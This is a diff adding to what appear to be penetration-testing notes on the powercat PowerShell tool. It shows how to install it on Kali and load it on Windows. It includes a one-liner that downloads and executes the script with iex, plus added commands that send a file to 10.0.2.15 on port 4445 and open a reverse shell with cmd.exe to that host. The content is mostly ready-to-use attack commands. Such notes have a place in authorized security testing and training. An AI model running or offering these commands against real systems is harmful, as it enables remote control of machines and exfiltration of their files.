@@ -194,3 +194,16 @@ Install in Kali: `apt install powercat`.
 The installation process places the script `powercat.ps1` at `/usr/share/windows-resources/powercat`. Copy the script to the Windows machine, and then run it from powershell in this way: `. .\powercat.ps1`. This makes variables and functions defined in the script accessible to the PS console. From here the command `powercat` is available.
 
 Tip: It is also possible to download the powercat script and run it using`iex`: ```iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')```
+
+### Send file
+```
+powercat -c 10.0.2.15 -p 4445 -i /path/to/file/to/send
+```
+
+#### Reverse shell
+```
+ powercat -c 10.0.2.15 -p 4445 -e cmd.exe
+```
+
+`-l` is for listening and perform all the opposite actions :)
+
